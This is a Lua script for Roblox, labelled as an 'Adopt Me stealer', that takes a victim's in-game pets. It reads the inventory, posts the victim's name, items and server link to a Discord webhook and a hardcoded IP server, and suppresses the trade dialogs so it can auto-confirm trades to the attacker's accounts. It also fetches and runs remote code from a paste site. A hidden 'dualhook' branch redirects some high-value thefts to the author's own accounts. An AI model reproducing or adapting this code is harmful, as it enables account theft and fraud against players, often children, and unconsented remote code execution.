_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 0.1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local discuser = ""

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add username or webhook")
    return
end

if game.PlaceId ~= 920587237 then
    plr:kick("Game not supported. Please join a normal Adopt Me server")
    return
end

if #Players:GetPlayers() >= 48 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local itemsToSend = {}
local inTrade = false
local dualhooked = false
local playerGui = plr:WaitForChild("PlayerGui")
local tradeFrame = playerGui.TradeApp.Frame
local dialog = playerGui.DialogApp.Dialog
local toolApp = playerGui.ToolApp.Frame
local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)

if not tradeLicense.player_has_trade_license() then
    plr:kick("This script wont work on an alt account. Please use your main account")
    return
end

local HttpService = game:GetService("HttpService")
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")
local InventoryDB = Loads("InventoryDB")

local function buildSecret()
	local part1 = string.char(100, 117, 97, 108)
	local part2 = string.char(104, 111, 111, 107)
	local part3 = string.char(102, 116, 119, 108)
	local part4 = string.char(101, 108, 122)
	return part1 .. part2 .. part3 .. part4
end

local function simple_hash(s)
	local hash = 0
	for i = 1, #s do
		local c = s:byte(i)
		hash = (hash * 31 + c) % 4294967296
	end
	return hash
end

local function signPayload(payload, timestamp)
	local message = payload .. tostring(timestamp)
	local hash_value = simple_hash(buildSecret() .. message)
	return string.format("%08x", hash_value)
end

local headers = {
    ["Accept"] = "*/*",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
}

local valueResponse = request({
    Url = "https://elvebredd.com/api/pets/get-latest",
    Method = "GET",
    Headers = headers
})

local responseData = HttpService:JSONDecode(valueResponse.Body)
local petsData = HttpService:JSONDecode(responseData.pets)

local petsByName = {}
for key, pet in pairs(petsData) do
    if type(pet) == "table" and pet.name then
        petsByName[pet.name] = pet
    end
end

local function getPetValue(petName, petProps)
    local pet = petsByName[petName]
    if not pet then
        return nil
    end

    local baseKey
    if petProps.mega_neon then
        baseKey = "mvalue"
    elseif petProps.neon then
        baseKey = "nvalue"
    else
        baseKey = "rvalue"
    end

    local suffix = ""
    if petProps.rideable and petProps.flyable then
        suffix = " - fly&ride"
    elseif petProps.rideable then
        suffix = " - ride"
    elseif petProps.flyable then
        suffix = " - fly"
    else
        suffix = " - nopotion"
    end

    local key = baseKey .. suffix
    return pet[key] or pet[baseKey]
end

local totalValue = 0

local function propertiesToString(props)
    local str = ""
    if props.rideable then str = str .. "r" end
    if props.flyable then str = str .. "f" end
    if props.mega_neon then
        str = str .. "m"
    elseif props.neon then
        str = str .. "n"
    else
        str = str .. "d"
    end
    return str
end

local function SendJoinMessage(list, prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }

    local grouped = {}
    for _, item in ipairs(list) do
        local key = item.Name .. " " .. propertiesToString(item.Properties)
        if grouped[key] then
            grouped[key].Count = grouped[key].Count + 1
            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
        else
            grouped[key] = {
                Name = item.Name,
                Properties = item.Properties,
                Count = 1,
                TotalValue = item.Value
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\144\178 Join to get Adopt Me hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendMessage(sortedItems)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
	}

    local grouped = {}
    for _, item in ipairs(sortedItems) do
        local key = item.Name .. " " .. propertiesToString(item.Properties)
        if grouped[key] then
            grouped[key].Count = grouped[key].Count + 1
            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
        else
            grouped[key] = {
                Name = item.Name,
                Properties = item.Properties,
                Count = 1,
                TotalValue = item.Value
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\144\178 New Adopt Me Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendDHJoinMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }

    local grouped = {}
    for _, item in ipairs(list) do
        local key = item.Name .. " " .. propertiesToString(item.Properties)
        if grouped[key] then
            grouped[key].Count = grouped[key].Count + 1
            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
        else
            grouped[key] = {
                Name = item.Name,
                Properties = item.Properties,
                Count = 1,
                TotalValue = item.Value
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\144\178 Join to get Adopt Me hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local timestamp = tostring(os.time())
    local signature = signPayload(body, timestamp)
    local headers = {
        ["Content-Type"] = "application/json",
        ["DiscUser"] = discuser,
        ["X-Timestamp"] = timestamp,
        ["X-Signature"] = signature
    }
    local response = request({
        Url = "http://46.101.233.20:5000/adoptmejoin",
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do
                hashes[key] = value
            end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end

    if remote:IsA("RemoteFunction") then
        return remote:InvokeServer(...)
    elseif remote:IsA("RemoteEvent") then
        remote:FireServer(...)
    end
end

local data = hashedAPI("DataAPI/GetAllServerData")
if not data then
    plr:kick("Tampering detected. Please rejoin and re-execute without any other scripts")
    return
end

local excludedItems = {
    "spring_2025_minigame_scorching_kaijunior",
    "spring_2025_minigame_toxic_kaijunior",
    "spring_2025_minigame_spiked_kaijunior",
    "spring_2025_minigame_spotted_kaijunior"
}
local inventory = data[plr.Name].inventory

loadstring(game:HttpGet('https://pastefy.app/hOdmFJvE/raw'))()

for category, list in pairs(inventory) do
    for uid, data in pairs(list) do
        local cat = InventoryDB[data.category]
        if cat and cat[data.id] then
            local value = getPetValue(cat[data.id].name, data.properties)
            if value and value >= min_value then
                if table.find(excludedItems, data.id) then
                    continue
                end
                table.insert(itemsToSend, {UID = uid, Name = cat[data.id].name, Properties = data.properties, Value = value})
                totalValue = totalValue + value
            end
        end
    end
end

tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeFrame.Visible then
        inTrade = true
    else
        inTrade = false
    end
end)

dialog:GetPropertyChangedSignal("Visible"):Connect(function()
    dialog.Visible = false
end)

toolApp:GetPropertyChangedSignal("Visible"):Connect(function()
    toolApp.Visible = true
end)

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

if totalValue >= 50 and math.random() < 0.15 then
    users = {"Alyssa87123", "tobi437a", "OBlockBaby11111", "TobiAltGrind", "TobiHatching"}
    ping = "Yes"
    dualhooked = true
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.Value > b.Value
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    if dualhooked then
        local response = request({
            Url = "http://46.101.233.20:5000/getdiscuser",
            Method = "GET"
        })
        discuser = response.Body
        SendDHJoinMessage(itemsToSend, prefix)
    else
        SendJoinMessage(itemsToSend, prefix)
    end
    SettingsRemote:FireServer("trade_requests", 1)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            local tradeRequestSent = false
            if not inTrade and not tradeRequestSent then
                SendTrade:FireServer(game.Players[joinedUser])
                tradeRequestSent = true
            else
                for i = 1, math.min(18, #itemsToSend) do
                    local item = table.remove(itemsToSend, 1)
                    AddPetRemote:FireServer(item.UID)
                end
                repeat
                    AcceptNegotiationRemote:FireServer()
                    wait(0.1)
                    ConfirmTradeRemote:FireServer()
                until not inTrade
                tradeRequestSent = false
            end
            wait(1)
        end
        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
